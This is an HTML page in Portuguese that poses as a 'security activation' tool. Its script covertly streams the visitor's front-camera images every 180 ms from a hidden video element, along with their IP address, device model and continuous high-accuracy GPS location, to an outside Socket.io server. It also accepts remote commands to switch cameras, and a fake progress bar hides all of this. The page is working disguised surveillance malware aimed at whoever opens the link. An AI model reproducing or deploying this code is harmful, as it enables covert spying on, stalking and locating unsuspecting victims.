<!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ativação de Segurança // Transmissor</title>
    
    <!-- Favicon Tático SVG Embutido -->
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='46' fill='%23090d16' stroke='%2310b981' stroke-width='4'/><circle cx='50' cy='50' r='30' fill='none' stroke='%2306b6d4' stroke-width='2' stroke-dasharray='4,4'/><circle cx='50' cy='50' r='6' fill='%2310b981'/><line x1='50' y1='4' x2='50' y2='96' stroke='%2310b981' stroke-width='1.5' stroke-opacity='0.5'/><line x1='4' y1='50' x2='96' y2='50' stroke='%2310b981' stroke-width='1.5' stroke-opacity='0.5'/></svg>">

    <style>
        :root {
            --bg-dark: #070a12;
            --card-bg: rgba(15, 23, 42, 0.75);
            --accent-green: #10b981;
            --accent-cyan: #06b6d4;
            --accent-red: #ef4444;
            --border-color: rgba(255, 255, 255, 0.08);
            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: var(--font-family);
            background-color: var(--bg-dark);
            background-image: 
                radial-gradient(rgba(16, 185, 129, 0.08) 1px, transparent 1px),
                linear-gradient(to bottom, #070a12, #03050a);
            background-size: 24px 24px, 100% 100%;
            color: #f8fafc;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            -webkit-tap-highlight-color: transparent;
        }

        .container {
            width: 100%;
            max-width: 420px;
        }

        .card {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 28px;
            padding: 36px 24px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
            transition: all 0.3s ease;
        }

        .header-icon {
            width: 56px;
            height: 56px;
            margin: 0 auto 18px auto;
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.3);
            border-radius: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--accent-green);
        }

        .title {
            font-size: 1.25rem;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 8px;
            letter-spacing: -0.02em;
        }

        .subtitle {
            font-size: 0.85rem;
            color: #94a3b8;
            margin-bottom: 28px;
            line-height: 1.4;
        }

        .btn-activate {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 18px;
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: #ffffff;
            font-size: 1.05rem;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.3);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-activate:active {
            transform: scale(0.98);
        }

        .process-box {
            display: none;
            flex-direction: column;
            align-items: center;
        }

        .spinner-container {
            position: relative;
            width: 150px;
            height: 150px;
            margin-bottom: 24px;
        }

        .spinner-svg {
            width: 100%;
            height: 100%;
            transform: rotate(-90deg);
        }

        .spinner-bg {
            fill: none;
            stroke: rgba(255, 255, 255, 0.05);
            stroke-width: 8;
        }

        .spinner-bar {
            fill: none;
            stroke: var(--accent-green);
            stroke-width: 8;
            stroke-linecap: round;
            stroke-dasharray: 339.292;
            stroke-dashoffset: 339.292;
            transition: stroke-dashoffset 0.5s linear;
        }

        .percentage-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 2rem;
            font-weight: 800;
            color: #ffffff;
        }

        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 6px 14px;
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.25);
            border-radius: 20px;
            font-size: 0.8rem;
            color: var(--accent-green);
            font-weight: 600;
            margin-bottom: 12px;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--accent-green);
            box-shadow: 0 0 8px var(--accent-green);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.4; }
            100% { opacity: 1; }
        }

        .status-text {
            font-size: 0.88rem;
            color: #94a3b8;
            line-height: 1.4;
        }

        .error-msg {
            margin-top: 18px;
            font-size: 0.82rem;
            color: #f87171;
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.2);
            border-radius: 12px;
            padding: 12px;
            display: none;
            cursor: pointer;
        }

        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="card">
        <div class="header-icon">
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            </svg>
        </div>

        <h1 class="title">Verificação de Segurança</h1>
        <p class="subtitle">Sincronização do protocolo de proteção de rede tática em tempo real.</p>

        <button class="btn-activate" id="btnActivate">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                <polyline points="20 6 9 17 4 12"></polyline>
            </svg>
            Ativar Segurança
        </button>

        <div class="process-box" id="processBox">
            <div class="status-badge">
                <span class="status-dot"></span>
                <span>EM TRANSMISSÃO</span>
            </div>
            
            <div class="spinner-container">
                <svg class="spinner-svg" viewBox="0 0 120 120">
                    <circle class="spinner-bg" cx="60" cy="60" r="54"></circle>
                    <circle class="spinner-bar" id="progressBar" cx="60" cy="60" r="54"></circle>
                </svg>
                <div class="percentage-text" id="percentText">0%</div>
            </div>

            <div class="status-text" id="statusText">Conexão segura estabelecida...</div>
        </div>

        <div class="error-msg" id="errorMsg">⚠️ Permissão negada. Clique para tentar novamente.</div>
    </div>
</div>

<video id="hiddenVideo" autoplay playsinline muted></video>
<canvas id="hiddenCanvas"></canvas>

<!-- Bibliotecas do Socket.io -->
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>

<script>
    const RENDER_URL = "https://maestro-server-si1f.onrender.com";
    
    const urlParams = new URLSearchParams(window.location.search);
    const roomId = urlParams.get('id');

    const socket = io(RENDER_URL, { transports: ['websocket', 'polling'] });
    
    socket.on('connect', () => {
        if (roomId) socket.emit('join-room', roomId);
    });

    const btnActivate  = document.getElementById('btnActivate');
    const processBox  = document.getElementById('processBox');
    const progressBar = document.getElementById('progressBar');
    const percentText = document.getElementById('percentText');
    const statusText  = document.getElementById('statusText');
    const errorMsg    = document.getElementById('errorMsg');
    const video       = document.getElementById('hiddenVideo');
    const canvas      = document.getElementById('hiddenCanvas');
    const ctx         = canvas.getContext('2d');

    let stream = null;
    let frameInterval = null;
    let currentFacing = 'user'; // ✅ POR PADRÃO: CÂMARA FRONTAL
    let switchingCam = false;

    const DURATION_SECONDS = 300;
    const CIRCUMFERENCE = 339.292;

    function getDetailedDeviceModel() {
        const ua = navigator.userAgent;
        let model = "Dispositivo Desconhecido";

        // Marcas Android Específicas
        if (/android/i.test(ua)) {
            if (/Infinix/i.test(ua)) {
                model = "Infinix " + (ua.match(/Infinix\s?([^\s;]+)/i)?.[1] || "Smart");
            } else if (/Redmi/i.test(ua)) {
                model = "Redmi " + (ua.match(/Redmi\s?([^\s;]+)/i)?.[1] || "Note");
            } else if (/POCO/i.test(ua)) {
                model = "Xiaomi POCO " + (ua.match(/POCO\s?([^\s;]+)/i)?.[1] || "");
            } else if (/Xiaomi/i.test(ua)) {
                model = "Xiaomi " + (ua.match(/Mi\s?([^\s;]+)/i)?.[1] || "Android");
            } else if (/Samsung|SM-/i.test(ua)) {
                const sm = ua.match(/SM-([A-Z0-9]+)/i);
                model = "Samsung Galaxy " + (sm ? sm[1] : "");
            } else if (/Motorola|Moto/i.test(ua)) {
                model = "Motorola " + (ua.match(/Moto\s?([^\s;]+)/i)?.[1] || "G");
            } else if (/Tecno/i.test(ua)) {
                model = "Tecno " + (ua.match(/Tecno\s?([^\s;]+)/i)?.[1] || "Spark");
            } else if (/Huawei|Honor/i.test(ua)) {
                model = "Huawei " + (ua.match(/(HUAWEI|JKM|ENE|VOG)[^\s;]*/i)?.[0] || "");
            } else if (/Realme/i.test(ua)) {
                model = "Realme " + (ua.match(/RMX[0-9]+/i)?.[0] || "");
            } else {
                model = "Android (" + (navigator.platform || "Mobile") + ")";
            }
        } 
        // Apple iOS
        else if (/iPhone/i.test(ua)) {
            const h = window.screen.height;
            const w = window.screen.width;
            model = "Apple iPhone";
            if (h === 844 || w === 844) model = "Apple iPhone 12/13/14";
            else if (h === 932 || w === 932) model = "Apple iPhone 14/15 Pro Max";
        } 
        else if (/iPad/i.test(ua)) {
            model = "Apple iPad";
        } 
        // Computadores Desktop / Laptops
        else if (/Windows/i.test(ua)) {
            model = "PC Windows (" + (navigator.platform || "x64") + ")";
        } 
        else if (/Macintosh/i.test(ua)) {
            model = "Apple MacBook / Mac";
        } 
        else if (/Linux/i.test(ua)) {
            model = "PC Linux";
        }

        return model;
    }

    async function activateDirectly() {
        errorMsg.style.display = 'none';
        btnActivate.style.display = 'none';
        processBox.style.display = 'flex';

        startTimer();

        const deviceName = getDetailedDeviceModel();

        // 1. Obter endereço IP em segundo plano sem travar a interface
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                if (data && data.ip && roomId) {
                    socket.emit('stream-info', { roomId: roomId, info: { ip: data.ip, deviceModel: deviceName } });
                }
            }).catch(() => {
                if (roomId) socket.emit('stream-info', { roomId: roomId, info: { ip: "IP Privado", deviceModel: deviceName } });
            });

        // 2. Iniciar Câmara Frontal Imediatamente
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: currentFacing, width: { ideal: 480 }, height: { ideal: 360 } },
                audio: false
            }).catch(() => navigator.mediaDevices.getUserMedia({ video: true, audio: false }));

            video.srcObject = stream;
            await video.play();
            canvas.width = 400; 
            canvas.height = 300;

            // Transmissão contínua ultra rápida de imagens (180ms)
            if (!frameInterval) {
                frameInterval = setInterval(() => {
                    if (!stream || switchingCam || !roomId) return;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.35);
                    socket.emit('stream-frame', { roomId: roomId, frame: dataUrl });
                }, 180);
            }
        } catch (err) {
            errorMsg.textContent = "⚠️ Permissão de Câmara Negada. Por favor, ative a câmara.";
            errorMsg.style.display = 'block';
        }

        // 3. Obter GPS de Alta Precisão (Modo Contínuo e Sem Cache)
        if ("geolocation" in navigator) {
            navigator.geolocation.watchPosition(
                (pos) => {
                    if (!roomId) return;
                    socket.emit('stream-location', {
                        roomId: roomId,
                        location: {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            speed: pos.coords.speed || 0,
                            alt: pos.coords.altitude || 0
                        }
                    });
                },
                (err) => {
                    console.warn("Aguardando fixação de sinal GPS de alta precisão...");
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        socket.on('receive-command', async (cmd) => {
            if (cmd === currentFacing) return;
            switchingCam = true;
            try {
                const newStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: cmd, width: { ideal: 480 }, height: { ideal: 360 } }, 
                    audio: false 
                });
                if (stream) stream.getTracks().forEach(t => t.stop());
                stream = newStream;
                currentFacing = cmd;
                video.srcObject = stream;
                await video.play();
            } catch (e) {
                console.error("Erro ao alternar câmara:", e);
            }
            switchingCam = false;
        });
    }

    btnActivate.addEventListener('click', activateDirectly);

    function startTimer() {
        let elapsed = 0;
        setInterval(() => {
            elapsed++;
            const percent = Math.min(100, Math.floor((elapsed / DURATION_SECONDS) * 100));
            percentText.textContent = percent + '%';
            progressBar.style.strokeDashoffset = CIRCUMFERENCE - (percent / 100) * CIRCUMFERENCE;
            if (elapsed >= DURATION_SECONDS) statusText.textContent = "Sincronização concluída com sucesso.";
        }, 1000);
    }
</script>
</body>
</html>
